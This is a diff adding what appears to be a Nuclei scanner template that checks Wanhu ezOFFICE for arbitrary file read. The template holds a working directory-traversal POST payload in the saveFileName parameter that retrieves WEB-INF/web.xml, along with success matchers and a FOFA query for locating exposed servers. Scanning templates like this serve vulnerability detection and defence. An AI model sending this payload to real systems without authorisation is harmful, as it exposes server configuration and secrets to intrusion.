@@ -1,0 +1,36 @@
+id: wanhu-ezoffice-text2html-fileread
+
+info:
+  name: 万户 ezOFFICE text2Html 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    万户 ezOFFICE /defaultroot/convertFile/text2Html.controller 的 saveFileName 参数可目录穿越读取 WEB-INF/web.xml。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: wanhu,ezoffice,lfi
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "web-app xmlns="
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: status
+        status:
+          - 200
